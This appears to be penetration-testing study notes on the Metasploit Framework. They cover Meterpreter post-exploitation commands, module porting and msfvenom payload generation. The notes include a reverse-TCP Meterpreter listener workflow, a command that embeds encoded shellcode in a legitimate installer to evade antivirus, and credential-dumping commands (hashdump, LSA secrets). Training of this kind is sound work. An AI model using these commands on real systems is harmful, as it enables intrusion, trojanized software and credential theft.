# Metasploit Framework (MSF) Comprehensive Summary & Methodology

---

## 1. Plugins and Mixins

### Overview of Plugins
- **Purpose:** Extend `msfconsole` functionality by integrating third-party tools, commercial software, or custom scripts interacting directly with the framework API.
- **Default Directory:** `/usr/share/metasploit-framework/plugins`
- **Management Commands:**
  - Load a plugin: `load <plugin_name>` (e.g., `load nessus`)
  - Install custom plugins: Copy the `.rb` file into the default plugin directory and load via console.

### Ruby Mixins
- Modular Ruby code included in classes to share optional functionalities and features without rigid parent-child inheritance (e.g., `Msf::Exploit::Remote::HttpClient`, `Msf::Exploit::PhpEXE`, `Msf::Auxiliary::Report`).

---

## 2. Meterpreter Payloads & Post-Exploitation

### Characteristics of Meterpreter
- **Design Goals:** Stealthy (in-memory execution, process migration, AES encryption), Powerful (channelized communication, rich built-in toolset), and Extensible (dynamic runtime module loading).
- **Execution Flow:** Target runs stager $\rightarrow$ Reflective DLL stub loads $\rightarrow$ Meterpreter core initializes and establishes an AES-encrypted link $\rightarrow$ Extensions (`stdapi`, `priv`) load dynamically.

### Essential Meterpreter Commands
| Command | Description |
| :--- | :--- |
| **`help` / `?`** | Displays the interactive Meterpreter help menu. |
| **`background` / `bg`** | Backgrounds the current active Meterpreter session. |
| **`sessions`** | Lists and switches between active sessions. |
| **`getuid`** | Displays the username of the current process. |
| **`ps`** | Lists running system processes. |
| **`steal_token <PID>`** | Impersonates the security token of a specified process. |
| **`migrate <PID>`** | Migrates the Meterpreter server payload into another process. |
| **`hashdump`** | Extracts local password hashes (LM/NTLM) from the SAM database. |
| **`lsa_dump_sam`** | Dumps detailed SAM database entries and keys as SYSTEM. |
| **`lsa_dump_secrets`** | Dumps LSA secrets, cached credentials, and system policy data. |

---

## 3. Writing, Importing, and Porting Modules

### Importing External Modules
- **Search Sources:** Use ExploitDB web interface (with the `MSF` tag filter) or the CLI tool `searchsploit`:
```
  bash
  searchsploit -t <query> --exclude=".py"
```

- **Directories:** System-wide at `/usr/share/metasploit-framework/modules/` or locally at `~/.msf4/modules/`.
    
- **Naming Conventions:** Use **snake-case** with alphanumeric characters and underscores (e.g., `nagios3_command_injection.rb`).
    
- **Loading in Console:** Use `loadpath /path/to/modules/` or `reload_all`.
### Porting Custom Scripts

- Leverage existing boilerplate modules from the target category.
- Ensure hard tabs are used for Ruby indentation.
- Fill out metadata (`Name`, `Description`, `References`, `Platform`, `Arch`), options (`register_options`), and execution logic.
## 4. MSFVenom Payload Generation

### Overview

- The successor to `MSFPayload` and `MSFEncode`, combining raw shellcode generation with encoding/obfuscation.
### Workflow Example (.aspx Payload Creation & Execution)

1. **Generate Payload:**
    Bash
    ```
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f aspx > reverse_shell.aspx
    ```
2. **Transfer/Upload:** Drop the payload into the target web root or via available services (e.g., FTP).
3. **Set Up Listener (`multi/handler`):**
    Plaintext
    ```
    msf6 > use multi/handler
    msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
    msf6 exploit(multi/handler) > set LHOST <IP>
    msf6 exploit(multi/handler) > set LPORT <PORT>
    msf6 exploit(multi/handler) > run
    ```
4. **Trigger Payload:** Access the file via browser or application request to catch the session.
## 5. Firewall, IDS/IPS, and Antivirus Evasion

### Defensive Mechanisms

- **Endpoint Protection:** Localized software (AV, firewalls, anti-malware).
    
- **Perimeter Protection:** Network edge devices, firewalls, and **DMZs**.
    
- **Detection Types:** Signature-based, Heuristic/Statistical Anomaly, Stateful Protocol Analysis, and Live-monitoring (SOC).
### Evasion Methodologies
- **AES Encryption:** Native in `msf6` for Meterpreter communications to evade network-based inspection.
- **Template Embedding (`-k` flag):** Embedding shellcode inside legitimate installers (e.g., TeamViewer) so the payload runs in a background thread without interrupting normal application execution:
    Bash
    ```
    msfvenom windows/x86/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -k -x ~/Downloads/Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/Setup.exe -i 5
    ```
- **Multi-Layer Archiving:** Password-protecting archives (RAR/ZIP) multiple times and stripping file extensions to hide file structures from automated static scanners.
- **Packers:** Compressing executables and decompression stubs together (e.g., UPX, Themida, MPRESS) to alter file signatures.
## 6. End-to-End Penetration Testing Methodology Process

```
[Phase 1: Reconnaissance & Enumeration]
       │
       ├── Nmap Scans & Service Fingerprinting (e.g., db_nmap)
       └── Identify Vulnerabilities & Framework Modules (search / searchsploit)
       ▼
[Phase 2: Exploit Selection & Import]
       │
       ├── Load Built-in or Port Custom Modules (snake-case, reload_all)
       └── Configure Module Options (RHOSTS, LHOST, TARGETURI)
       ▼
[Phase 3: Payload Crafting & Delivery]
       │
       ├── Generate Custom Payloads via MSFVenom (aspx, php, exe)
       ├── Apply Evasion Techniques (Templates, Encoders, Multi-layer Archiving)
       └── Upload/Deliver Payload to Target Service (FTP, WebDAV, etc.)
       ▼
[Phase 4: Execution & Session Capture]
       │
       ├── Initialize Multi/Handler Listener in msfconsole
       └── Trigger Payload Execution (HTTP request / service interaction)
       ▼
[Phase 5: Post-Exploitation & Privilege Escalation]
       │
       ├── Verify Access Level (getuid, sysinfo)
       ├── Background Session and Run Local Exploit Suggester
       ├── Execute Local PrivEsc Exploits (e.g., KiTrap0D, MS15-051)
       └── Harvest Loot (hashdump, lsa_dump_sam, token impersonation)
```